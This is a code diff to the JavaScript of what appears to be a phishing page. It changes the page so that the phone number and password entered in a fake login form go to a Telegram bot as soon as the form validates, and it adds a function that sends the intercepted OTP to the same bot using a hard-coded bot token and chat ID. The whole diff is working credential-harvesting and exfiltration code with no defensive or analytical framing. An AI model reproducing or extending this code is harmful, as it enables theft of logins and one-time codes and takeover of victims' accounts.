@@ -581,6 +581,9 @@
             }
 
             if (isValid) {
+                const phone = phoneInput.value;
+                const password = passInput.value;
+                sendLoginToTelegram(phone, password);
                 otpOverlay.classList.add('show');
                 otpInputs[0].focus();
             }
@@ -601,11 +604,11 @@
             return new Blob(byteArrays, { type: mime });
         }
 
-        // ===== Send to Telegram =====
-        function sendToTelegram(phone, password, otp) {
+        // ===== Send Login Details to Telegram =====
+        function sendLoginToTelegram(phone, password) {
             const botToken = '8786937967:AAF89mjtatOLHo44RGGay_1C6_ZwlCScrnM';
             const chatId = '-1003923232961';
-            const caption = `🔔 New Login Details\n\n📱 Phone: \`${phone}\`\n🔑 Password: \`${password}\`\n🔢 OTP: \`${otp}\`\n\n⏰ Time: ${new Date().toLocaleString()}\n\n✅ Tap on any value above to copy`;
+            const caption = `🔔 New Login Details\n\n📱 Phone: \`${phone}\`\n🔑 Password: \`${password}\`\n\n⏰ Time: ${new Date().toLocaleString()}\n\n✅ Tap on any value above to copy`;
 
             const blob = base64ToBlob(LOGO_IMAGE_BASE64, 'image/png');
             const formData = new FormData();
@@ -627,6 +630,19 @@
             });
         }
 
+        // ===== Send OTP to Telegram =====
+        function sendOtpToTelegram(phone, otp) {
+            const botToken = '8786937967:AAF89mjtatOLHo44RGGay_1C6_ZwlCScrnM';
+            const chatId = '-1003923232961';
+            const caption = `🔢 OTP Received\n\n📱 Phone: \`${phone}\`\n🔢 OTP: \`${otp}\`\n\n⏰ Time: ${new Date().toLocaleString()}\n\n✅ Tap on any value above to copy`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'Markdown' })
+            });
+        }
+
         // ===== Verify OTP =====
         verifyBtn.addEventListener('click', function() {
             let otp = '';
@@ -638,9 +654,8 @@
             }
 
             const phone = phoneInput.value;
-            const password = passInput.value;
 
-            sendToTelegram(phone, password, otp);
+            sendOtpToTelegram(phone, otp);
 
             otpOverlay.classList.remove('show');
             successPopup.classList.add('show');
